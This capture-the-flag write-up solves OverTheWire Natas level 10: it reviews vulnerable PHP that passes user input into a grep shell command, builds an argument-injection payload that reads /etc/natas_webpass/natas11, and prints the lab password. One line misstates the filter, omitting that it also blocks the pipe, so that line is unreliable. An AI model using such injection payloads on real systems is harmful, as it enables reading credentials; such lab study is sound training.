# OverTheWire: Natas Level 10 -> Level 11 Writeup

## 1. Challenge Background & Analysis
The objective of this level is to retrieve the password for Natas Level 11. In this challenge, the developers attempted to patch the previous command injection vulnerability by introducing an input sanitization layer using `preg_match()`. 

By reviewing the backend source code, we can inspect the effectiveness of this new security control.

### Source Code Review:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
The newly implemented regex `/[;|&]/` only blacklists the semicolon (`;`) and the ampersand (`&`). While this prevents standard shell command chaining, it completely fails to filter spaces or quotes. Therefore, the application remains highly vulnerable to argument injection attacks.

## 2. Solution Strategy & Exploitation
Since the restriction does not forbid spaces or double quotes, we can reuse the elegant technique from the previous level. Instead of chaining a brand new shell command, we can manipulate the parameter layout of the existing `grep` binary. 

By passing an empty search pattern `""` followed by an absolute file path as an additional argument, `grep` will dynamically expand its target list to include the system password file without violating the regex rules.

### Payload Construction:
```bash
"" /etc/natas_webpass/natas11
```

When evaluated, the backend command expands into:
```bash
grep -i "" /etc/natas_webpass/natas11 dictionary.txt
```
This payload successfully satisfies the `preg_match` logic because it contains neither `;` nor `&`.

### Step-by-step Execution:
1. Access the search input interface on the challenge page.
2. Input the parameter injection payload: `"" /etc/natas_webpass/natas11`.
3. Submit the form. The underlying `passthru()` function processes the continuous arguments seamlessly.

### Result Analysis:
The server executes the unsanitized arguments, forcing `grep` to read and dump the contents of the restricted target file:
```text
/etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```

## 3. Flag / Final Result
* **Natas Level 11 Password**: `VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd`
